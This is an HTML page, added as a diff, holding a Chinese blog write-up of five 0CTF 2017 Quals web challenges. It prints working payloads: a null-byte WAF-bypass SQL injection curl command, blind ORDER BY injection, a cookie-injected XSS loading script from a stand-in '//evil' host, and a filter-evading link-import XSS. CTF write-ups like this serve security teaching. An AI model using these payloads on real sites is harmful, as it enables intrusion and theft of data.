@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<!-- saved from url=(0061)https://blog.cal1.cn/post/0CTF%202017%20Quals%20web%20writeup -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0CTF 2017 Quals web writeup - crblog</title>
+    
+    <!--<link href="//cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">-->
+    <link href="./0CTF 2017 Quals web writeup - crblog_files/bootstrap.min.css" rel="stylesheet">
+    <link href="./0CTF 2017 Quals web writeup - crblog_files/yue.css" rel="stylesheet">
+    <link href="./0CTF 2017 Quals web writeup - crblog_files/style.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/png" href="https://blogstatic-1252090343.cosgz.myqcloud.com/h1209.png">
+</head>
+<body>
+<nav class="navbar navbar-default navbar-static-top">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false">
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="https://blog.cal1.cn/">crblog</a>
+        </div>
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+            <ul class="nav navbar-nav">
+                <li><a href="https://blog.cal1.cn/">主页</a></li>
+                <li><a href="https://blog.cal1.cn/archive">归档</a></li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right">
+                <li><a href="https://blog.cal1.cn/link">关于</a></li>
+            </ul>
+        </div>
+    </div>
+</nav>
+<div class="container yue">
+    
+    <div class="page-header">
+        <h1>0CTF 2017 Quals web writeup</h1><span>发表于 2017年3月20日</span>
+    </div>
+    
+        <h2>simple sqli</h2>
+<p>index.php 接收 id 参数， <code>id=floor(pi())</code> 与 <code>id=3</code> 返回的结果相同，可以猜测 SQL 语句可能是</p>
+<pre><code>SELECT * FROM foo WHERE id = $_GET['id']
+</code></pre>
+
+<p>测试可知 SQL 语句存在语法错误时返回 HTTP 500 ；SELECT FROM 之类的关键字被 WAF 拦截了。传入 <code>id=length('select')/6</code> 应与 <code>id=1</code> 相同。用 BurpSuite 在 select 中加单个字符，观察返回内容可以发现一些字符在进入 SQL 语句之前会被过滤掉（替换成空）：</p>
+<p><img alt="" src="./0CTF 2017 Quals web writeup - crblog_files/截图20170319200919.png!webp"></p>
+<p>也就是说 <code>sel%00ect</code> 在通过 WAF 后、进入 SQL 语句前变成了 <code>select</code>，这样我们就可以注入了：</p>
+<pre><code class="html">$ curl http://202.120.7.203/index.php?id=0+union+selec%00t+1,(selec%00t+flag+fro%00m+flag),3
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;title&gt;flag{W4f_bY_paSS_f0R_CI}&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+    &lt;h3&gt;flag{W4f_bY_paSS_f0R_CI}&lt;/h3&gt;
+    &lt;div class="main"&gt;
+        3    &lt;/div&gt;
+    &lt;p&gt;&lt;a href="index.php?id=1"&gt;View article&lt;/a&gt;&lt;/p&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<h2>Temmo's Tiny Shop</h2>
+<p>注册登录后有购买/售出/搜索的功能。注册完帐号内有4000元，HINT 需要 8000 元才能购买，可以想到应该是通过条件竞争来加钱。然而刚开始做的时候题目有问题，一旦有人注册，所有帐号里的钱都会变多，直接买了 HINT。HINT 里写了表名和列名：</p>
+<pre><code>select flag from b7d8769d64997e392747dbad9cd450c4
+</code></pre>
+
+<p>所以接下来应该是找注入点。搜索功能除了关键字，还可以选择排序方式(order=price/name)。测试发现 price/name 是直接在 get 参数中传递的，可以推断出 order 前后并没有引号保护，SQL 语句可能是：</p>
+<pre><code>SELECT * FROM foo WHERE name LIKE '%$_GET['keyword']%' order by $_GET['order']
+</code></pre>
+
+<p>经测试发现 order 参数不能含有空格，可以用括号来替代，利用 name 和 price 排序的不同顺序来盲注：</p>
+<pre><code>SELECT * FROM foo WHERE name LIKE '%%' order by if(1=1,name,price)
+</code></pre>
+
+<p>由于 order 参数限制长度为 100 字符以内，所以用 BurpSuite 的 intruder 中将 Attack type 选为 Cluster bomb，在 mid() 的第二个参数和 like 的 asciihex 上设置变量生成 payload。</p>
+<p><img alt="" src="./0CTF 2017 Quals web writeup - crblog_files/截图20170320191012.png!webp">
+<img alt="" src="./0CTF 2017 Quals web writeup - crblog_files/截图20170320191050.png!webp"></p>
+<p>最后用 intruder 的导出结果功能，把条件为真的 payload1 与 payload2 导出即可。</p>
+<h2>KoG</h2>
+<p>观察网页源码中的这段 js:</p>
+<pre><code class="javascript">function go() {
+    args = GetUrlParms();
+    if (args["id"] != undefined) {
+        var value = args["id"];
+        var ar = Module.main(value).split("|");
+        if (ar.length == 3) {
+            var s = "api.php?id=" + args["id"] + "&amp;hash=" + ar[0] + "&amp;time=" + ar[1];
+            $(document).ready(function() {
+                content = $.ajax({
+                    url: s,
+                    async: false
+                });
+                $("#output").html(content.responseText);
+            });
+
+        }
+        if ((ar.length == 1) &amp; (ar[0] == 'WrongBoy')) {
+            alert('Hello Hacker~');
+        }
+    }
+}
+
+var wait = setInterval(function() {
+    if (Module.main != undefined) {
+        clearInterval(wait);
+        go();
+    }
+}, 100);
+</code></pre>
+
+<p>将 url 中的 id 参数传入 Module.main() 获得 hash，带 hash 对 api.php 发起请求。api.php 对 hash 进行校验，校验通过就将 id 代入 SQL 语句进行查询并返回结果。</p>
+<p>所以这题的关键是 Module.main()，测试发现传入的参数如果不是数字会返回 WrongBoy，否则返回对应的 hash。这个函数在 functionn.js 里，搜索特征发现是用 Emscripten 从 C/C++ 编译成的 js，两万多行看得头都大了。</p>
+<p>头再大也要做题啊，于是就开了两个窗口，一个执行 Module.main('1')，另一个执行 Module.main('q')，F11 单步跟踪调试，发现两者在 7633 行的 <code>$13 = ($12|0)==(199401);</code> 结果不同，7659行的 <code>$25 = ($i$0|0)==($26|0);</code> 结果也不同，直接改这两个变量可以得到字符串的 hash 了。</p>
+<p><img alt="" src="./0CTF 2017 Quals web writeup - crblog_files/截图20170320192944.png!webp"></p>
+<p><img alt="" src="./0CTF 2017 Quals web writeup - crblog_files/截图20170320194251.png!webp"></p>
+<h2>complicated XSS</h2>
+<p>题目告诉我们 flag 在子域名 <code>http://admin.government.vip:8000</code>，访问该链接重定向到 <code>/login</code>，登录后回到 <code>/</code>，服务端从 cookie 中取出 username 输出在页面上。修改 username 发现并没有跟 session 对应，所以我们就有了在 admin 子域下执行 js 的能力。</p>
+<p><img alt="" src="./0CTF 2017 Quals web writeup - crblog_files/截图20170320195414.png!webp"></p>
+<p>先在 <code>http://government.vip/</code> 提交带有 img 标签的 XSS Payload，从 Referer 可知管理员会在 <code>http://government.vip/</code> 域下访问我们的 Payload。由于 Cookie 的<a href="https://tools.ietf.org/html/rfc6265#section-8.5">脆弱性</a>，我们可以在 government.vip 为子域设置 cookie，然后通过跳转来触发 XSS。</p>
+<p>虽然我们可以在 admin 域上执行 js 了，但是由于 <code>http://admin.government.vip:8000/</code> 禁用了很多函数，只能用跳转的方法传出已有的数据，没法用 XHR 发出 POST/GET 请求，由于这题的 BOT 用的是 PhantomJS (从 UA 知道的)，所以 fetch() 也是不能用的。</p>
+<pre><code>delete window.Function;
+delete window.eval;
+delete window.alert;
+delete window.XMLHttpRequest;
+delete window.Proxy;
+delete window.Image;
+delete window.postMessage;
+</code></pre>
+
+<p>然而同源的 <code>/login</code> 并没有禁用 XHR，所以可以通过 iframe 来“借用” <code>/login</code> 的 XHR。</p>
+<p>Payload:</p>
+<pre><code class="javascript">document.cookie = "username=&lt;/h1&gt;&lt;script src='//evil/1.js'&gt;&lt;/script&gt;;path=/;domain=.government.vip"
+window.location.href = "//evil/2.html"
+</code></pre>
+
+<p>2.html 包含 <code>/login</code> 和 <code>/</code> 两个iframe，1.js 中用 <code>this.XMLHttpRequest = top.frames[0].XMLHttpRequest</code> 来获得 XHR。读取当前页面源码发现有个上传表单，XHR POST 上传后即可获得 flag 。</p>
+<h2>simple XSS</h2>
+<p>题目让我们提交 XSS Payload，绕过过滤拿到 <code>/flag.php</code> 的内容。用 intruder 提交 %00~%ff 可以知道这些字符是不能用的：</p>
+<pre><code>!"#$%&amp;'(),./:;&gt;?@[]`{}
+</code></pre>
+
+<p>$、反引号和括号已经把 inline js 一棒子打死了（可以说是孙悟空了），注意到左尖括号并没有被拦截，所以这里一定是插入一个不需要闭合的标签来执行 js 了。</p>
+<p>第一反应想到的就是 <code>&lt;link rel=import href=url</code>，问了下出题人 @md5_salt 说 BOT 不是 PhantomJS，是真的 Chrome Stable。然而加载外域资源得用到 <code>/</code>，尝试了下 <code>\\octip</code> 并不行，其实这里踩了 Windows UNC Path 的坑，其他系统中 Chrome 会将 <code>\\</code> 解释成当前协议。然而当前协议是 HTTPS，<a href="https://sg.godaddy.com/zh/help/can-i-request-a-certificate-for-an-intranet-name-or-ip-address-6935">SSL 证书与域名绑定</a>，这儿又不能用 <code>.</code>，无法传入域名，如果直接传入 <code>\\octip</code>，Chrome 会认为 <code>https://ip</code> 该请求不安全而拦截。由于之前出题也用过 PhantomJS，发现并不支持 Chrome 的一些特性，重新整理思路，思考了下两者的差异，发现可以用中文的句号 <code>。</code> 来替代 <code>.</code>，于是最终的 Payload:</p>
+<pre><code>&lt;link rel=import href=\\your。domain
+</code></pre>
+    
+
+</div>
+<footer class="footer">
+    <div class="container">
+        <div class="footer-collapse">
+            <span>chromium1337 # 2017</span>
+        </div>
+    </div>
+</footer>
+<script src="./0CTF 2017 Quals web writeup - crblog_files/jquery.min.js"></script>
+<script src="./0CTF 2017 Quals web writeup - crblog_files/bootstrap.min.js"></script>
+
+
+</body></html>
